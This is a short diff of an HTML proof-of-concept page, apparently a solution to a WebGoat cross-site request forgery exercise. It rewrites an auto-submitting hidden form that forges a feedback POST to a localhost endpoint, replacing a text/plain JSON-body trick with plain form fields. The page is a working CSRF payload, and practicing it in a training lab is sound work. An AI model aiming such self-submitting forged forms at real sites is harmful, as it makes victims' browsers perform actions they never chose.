@@ -1,17 +1,12 @@
 <!doctype html>
 <html>
   <body>
-    <form id="csrfForm"
-          action="http://localhost:8080/WebGoat/csrf/feedback/message"
-          method="POST"
-          enctype="text/plain">
-
-      <input type="hidden" name='{"email":"webgoat@webgoat.org","message":"WebGoat is the best!","name":"WebGoat","subject":"service"}' value=''>
-
+    <form id="f" method="POST" action="http://localhost:8080/WebGoat/csrf/feedback/message">
+      <input type="hidden" name="name" value="WebGoat">
+      <input type="hidden" name="email" value="webgoat@webgoat.org">
+      <input type="hidden" name="subject" value="service">
+      <input type="hidden" name="message" value="WebGoat is the best!">
     </form>
-
-    <script>
-      document.getElementById("csrfForm").submit();
-    </script>
+    <script>document.getElementById('f').submit();</script>
   </body>
 </html>
